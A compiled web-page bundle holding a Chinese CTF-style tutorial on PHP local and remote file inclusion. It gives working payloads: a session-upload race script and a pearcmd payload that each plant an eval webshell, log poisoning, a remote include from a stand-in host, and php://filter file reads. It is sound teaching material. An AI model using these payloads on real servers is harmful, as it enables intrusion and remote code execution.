(window.webpackJsonp=window.webpackJsonp||[]).push([[32],{394:function(s,t,a){"use strict";a.r(t);var n=a(7),e=Object(n.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h2",{attrs:{id:"文件包含"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#文件包含"}},[s._v("#")]),s._v(" 文件包含")]),s._v(" "),t("p",[t("code",[s._v("include")]),s._v("主要用于包含和执行另一个 PHP 文件的代码。include 会将被包含文件的内容插入到调用它的文件中，并在那个位置执行")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token php language-php"}},[t("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("include")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'header.php'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("<")]),s._v("h1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),s._v("欢迎来到我的网站"),t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("</")]),s._v("h1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token php language-php"}},[t("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("include")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'footer.php'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br")])]),t("p",[s._v("include('1.txt') 将尝试包含并执行 1.txt 文件中的所有内容。如果 1.txt 中包含的是PHP代码，则该代码将在当前页面被解析为PHP执行。如果文件中包含的是普通文本，那么这段文本将显示到屏幕上，因为 include() 在处理纯文本文件时会直接输出文件内容，不局限于txt文件，图片马，含有php代码的文件理论都可以试试。")]),s._v(" "),t("p",[s._v("文件包含又分为本地包含，远程文件包含(需要在php.ini打开allow_url_include)")]),s._v(" "),t("ul",[t("li",[s._v("本地包含可以访问服务器端的文件，例如flag，日志，图片马")]),s._v(" "),t("li",[s._v("远程文件包含可以在远程自己的vps写一个php代码的txt文件")])]),s._v(" "),t("h2",{attrs:{id:"include"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#include"}},[s._v("#")]),s._v(" include")]),s._v(" "),t("p",[s._v("include,require等都可以包含文件")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("include")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'filename'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("include")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'filename'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("require")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'filename'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("require")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'filename'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("p",[s._v("include是php的语言结构，include()是PHP的函数，都可以包含文件")]),s._v(" "),t("p",[s._v("'filename' 是要包含的文件的路径和名称")]),s._v(" "),t("h2",{attrs:{id:"文件操作函数"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#文件操作函数"}},[s._v("#")]),s._v(" 文件操作函数")]),s._v(" "),t("blockquote",[t("p",[s._v("常见的文件包含函数如下1 include "),t("strong",[s._v("2 require")]),s._v(" 3 include_once 4 require_once 5 highlight_file 6 show_source "),t("strong",[s._v("7 file")]),s._v(" "),t("strong",[s._v("8 readfile")]),s._v(" 9 file_get_contents 10 file_put_contents 11 fopen  将一个文件的内容包含到另一个文件  ，在文件包含时可以搭配使用php伪协议打一套组合拳")])]),s._v(" "),t("h2",{attrs:{id:"本地文件包含"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#本地文件包含"}},[s._v("#")]),s._v(" 本地文件包含")]),s._v(" "),t("h3",{attrs:{id:"日志包含"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#日志包含"}},[s._v("#")]),s._v(" 日志包含")]),s._v(" "),t("p",[s._v("本地文件包含常配合文件上传，图片马，日志包含等进行利用，"),t("code",[s._v("文件上传")]),s._v("在这里省略，讲一下日志包含")]),s._v(" "),t("p",[s._v("访问日志（access.log）：")]),s._v(" "),t("blockquote",[t("p",[s._v("Nginx"),t("br"),s._v("\n默认的日志文件目录通常位于/var/log/nginx/access.log")])]),s._v(" "),t("blockquote",[t("p",[s._v("Apache")]),s._v(" "),t("ul",[t("li",[s._v("对于Ubuntu/Debian系统，通常位于/var/log/apache2/access.log")]),s._v(" "),t("li",[s._v("对于CentOS/RHEL系统，通常位于/var/log/httpd/access_log")])])]),s._v(" "),t("p",[s._v("在f12浏览器调试下，可以看到服务器类型，ctfshow中靶机是nginx")]),s._v(" "),t("p",[s._v("nginx日志文件目录/var/log/nginx/access.log，对于当前网页的相对路径不确定，用../试试，../../../三级时可以访问到日志文件，使用post在报文的UA值中写入一句话木马，或phpinfo函数，试试看能否写入日志文件")]),s._v(" "),t("h3",{attrs:{id:"session包含"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#session包含"}},[s._v("#")]),s._v(" session包含")]),s._v(" "),t("p",[t("a",{attrs:{href:"https://www.freebuf.com/vuls/202819.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("参考"),t("OutboundLink")],1)]),s._v(" "),t("p",[s._v("session是网站web的一个无后缀文件，当开启session时，服务器会在临时目录下创建session文件来保存会话信息，文件名格式为sess_PHPSESSID。一般的linux会将session保存在其中的某一个目录下：")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("/var/lib/php/\n/var/lib/php/sessions/\n/tmp/\n/tmp/sessions/\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("p",[s._v("一般在/tmp目录下")]),s._v(" "),t("p",[s._v("用户可以自定义创建session，实现"),t("strong",[s._v("session文件包含----条件竞争脚本")])]),s._v(" "),t("div",{staticClass:"language-python line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" io\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" requests\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" threading\n\nurl "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'替换url'")]),s._v("\nsessionid "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'hacker'")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("write")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("session"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 写入临时文件")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("while")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("True")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        fileBytes "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" io"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("BytesIO"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'a'")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1024")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("50")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 50kb")]),s._v("\n        session"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("post"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n        cookies "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'PHPSESSID'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("sessionid"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n        data "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'PHP_SESSION_UPLOAD_PROGRESS'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"<?php file_put_contents('/var/www/html/shell.php','<?php eval($_POST[1]);?>');?>\"")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n        files"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'file'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'1.jpg'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("fileBytes"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("read")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("session"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("while")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("True")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        session"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("get"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'?file=/tmp/sess_'")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("sessionid"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 进行文件包含")]),s._v("\n        r "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" session"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("get"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'shell.php'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 检查是否写入一句话木马")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" r"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("status_code "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n            "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'OK'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\nevnet"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("threading"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Event"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 多线程")]),s._v("\n\nsession "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" requests"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("session"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" i "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("range")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    threading"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Thread"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("target "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" write"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("args "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("session"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("start"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" i "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("range")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    threading"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Thread"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("target "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" read"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("args "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("session"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("start"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nevnet"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("set")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br"),t("span",{staticClass:"line-number"},[s._v("27")]),t("br"),t("span",{staticClass:"line-number"},[s._v("28")]),t("br"),t("span",{staticClass:"line-number"},[s._v("29")]),t("br"),t("span",{staticClass:"line-number"},[s._v("30")]),t("br"),t("span",{staticClass:"line-number"},[s._v("31")]),t("br"),t("span",{staticClass:"line-number"},[s._v("32")]),t("br"),t("span",{staticClass:"line-number"},[s._v("33")]),t("br")])]),t("h3",{attrs:{id:"pear文件包含"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#pear文件包含"}},[s._v("#")]),s._v(" pear文件包含")]),s._v(" "),t("p",[s._v("引入"),t("strong",[s._v("P牛")]),s._v("师傅原话")]),s._v(" "),t("div",{staticClass:"custom-block tip"},[t("p",{staticClass:"custom-block-title"},[s._v("提示")]),s._v(" "),t("p",[s._v("pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。")])]),s._v(" "),t("p",[s._v("原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事")]),s._v(" "),t("p",[s._v("先包含"),t("code",[s._v("pear")]),s._v("文件，利用php的命令行参数"),t("code",[s._v("config-create")]),s._v("写文件，所以payload：")]),s._v(" "),t("p",[s._v("payload里存在"),t("code",[s._v("&")]),s._v(","),t("code",[s._v("+")]),s._v("等特殊字符，直接使用hackbar发包会被编码失去原意，导致执行失败，所以要使用bp发包")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[s._v("?file=/usr/local/lib/php/pearcmd.php&+config-create+/"),t("span",{pre:!0,attrs:{class:"token php language-php"}},[t("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?=")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("highlight_file")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("__FILE__")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("eval")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_POST")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),t("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("+/tmp/11\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("再包含目录文件"),t("code",[s._v("/tmp/11")]),s._v("，完成利用")]),s._v(" "),t("h2",{attrs:{id:"远程文件包含"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#远程文件包含"}},[s._v("#")]),s._v(" 远程文件包含")]),s._v(" "),t("p",[s._v("在php.ini配置文件中打开"),t("strong",[s._v("allow_url_include")]),s._v("时，可以将远程恶意文件包含在服务器端执行")]),s._v(" "),t("p",[s._v("例如")]),s._v(" "),t("p",[s._v("漏洞代码")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token php language-php"}},[t("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$url")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'url'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("include")]),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$url")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("p",[s._v("测试文件")]),s._v(" "),t("div",{staticClass:"language-txt line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-txt"}},[t("code",[s._v("<?php\nphpinfo();\n?>\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[s._v("当攻击者在"),t("strong",[s._v("http://a.com/1.txt")]),s._v("写入php代码时，使用GET传参控制?url="),t("strong",[s._v("http://a.com/1.txt")]),s._v("，那么服务器端将执行1.txt中的php代码")]),s._v(" "),t("h2",{attrs:{id:"php伪协议"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#php伪协议"}},[s._v("#")]),s._v(" PHP伪协议")]),s._v(" "),t("h2",{attrs:{id:"常用php伪协议"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#常用php伪协议"}},[s._v("#")]),s._v(" 常用php伪协议")]),s._v(" "),t("blockquote",[t("p",[s._v("PHP 伪协议是一种特殊的 PHP 特性，允许在 PHP 中通过类似 URL 的方式来访问各种资源，如文件、数据流等")]),s._v(" "),t("ul",[t("li",[s._v("file://: 允许 PHP 访问本地文件系统中的文件")]),s._v(" "),t("li",[s._v("http:// 或 https://: 允许 PHP 通过 HTTP 或 HTTPS 协议访问远程服务器上的资源")]),s._v(" "),t("li",[s._v("ftp://: 允许 PHP 通过 FTP 协议访问远程 FTP 服务器上的文件。")]),s._v(" "),t("li",[s._v("php://: 提供了访问各种输入输出流的方式")]),s._v(" "),t("li",[s._v("data://: 允许在 PHP 中直接使用数据 URI，将数据嵌入到 URL 中")])])]),s._v(" "),t("h3",{attrs:{id:"php-filter"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#php-filter"}},[s._v("#")]),s._v(" php://filter/")]),s._v(" "),t("p",[s._v("payload1："),t("strong",[s._v("url?c=include$_GET[1];&1=php://filter/convert.base64-encode/resource=flag.php")])]),s._v(" "),t("h4",{attrs:{id:"拆分理解"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#拆分理解"}},[s._v("#")]),s._v(" 拆分理解")]),s._v(" "),t("p",[t("strong",[s._v("php://filter")]),s._v("作用将数据，文件内容封装起来")]),s._v(" "),t("p",[t("strong",[s._v("convert")]),s._v("数据编码转换器，不进行编码的话，flag.php会作为php文件运行，无法看到文件内容")]),s._v(" "),t("p",[t("strong",[s._v("base64-encode")]),s._v("使用base64的编码格式打印出来")]),s._v(" "),t("p",[s._v("highlight_file($_GET['cmd'])，也可以利用伪协议读文件")]),s._v(" "),t("p",[s._v("根据这张图，还可以再延申出几种方式")]),s._v(" "),t("p",[s._v("一些编码格式")]),s._v(" "),t("ul",[t("li",[s._v("php://filter/convert.base64-encode/resource=1.php")]),s._v(" "),t("li",[s._v("php://filter/string.rot13/resource=1.php")]),s._v(" "),t("li",[s._v("php://filter//convert.iconv.SJIS*.UCS-4*/resource=1.php")])]),s._v(" 